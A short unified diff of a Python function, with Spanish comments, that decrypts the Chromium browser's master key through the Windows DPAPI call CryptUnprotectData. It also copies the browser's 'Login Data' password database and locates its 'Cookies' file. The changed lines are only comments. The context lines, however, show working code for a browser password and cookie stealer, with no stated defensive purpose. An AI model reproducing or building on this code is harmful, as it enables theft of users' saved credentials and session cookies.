@@ -51,7 +51,7 @@ def get_data(navegador: list):
     #desencripto la llave
     key = win32crypt.CryptUnprotectData(base64.b64decode(json_key["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
 
-    #traigo archivo login
+    #traigo archivo de logins
     file_passwords = os.path.join(work_dir, "Default", "Login Data")
     # copio el archivo de base de datos para no tener errores
     shutil.copyfile(file_passwords, "dataLogin")
@@ -76,6 +76,7 @@ def get_data(navegador: list):
     database.close()
 
     #COOKIES
+    #traigo archivo de cookies
     file_cookies = os.path.join(work_dir, "Default", "Network", "Cookies")
 
     try:
